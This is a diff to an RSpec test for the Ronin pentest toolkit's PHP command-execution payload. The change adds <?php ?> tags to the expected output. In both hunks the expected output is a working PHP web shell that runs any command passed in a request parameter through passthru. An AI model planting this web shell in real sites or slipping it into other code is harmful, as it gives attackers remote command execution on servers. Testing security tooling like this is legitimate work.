@@ -27,7 +27,7 @@ describe Ronin::Payloads::PHP::CmdExec do
 
     it "must return PHP code that executes the command from the 'cmd' query_param and returns the output in <exec>...</exec> tags" do
       expect(subject.payload).to eq(
-        %{if(isset($_REQUEST["cmd")){echo "<exec>";passthru($_REQUEST["cmd"]);echo "</exec>";}}
+        %{<?php if(isset($_REQUEST["cmd")){echo "<exec>";passthru($_REQUEST["cmd"]);echo "</exec>";}?>}
       )
     end
 
@@ -44,7 +44,7 @@ describe Ronin::Payloads::PHP::CmdExec do
 
       it "must return PHP code that executes the command from the  query_param and returns the output in <exec>...</exec> tags" do
         expect(subject.payload).to eq(
-          %{if(isset($_REQUEST["#{query_param}")){echo "<exec>";passthru($_REQUEST["#{query_param}"]);echo "</exec>";}}
+          %{<?php if(isset($_REQUEST["#{query_param}")){echo "<exec>";passthru($_REQUEST["#{query_param}"]);echo "</exec>";}?>}
         )
       end
     end
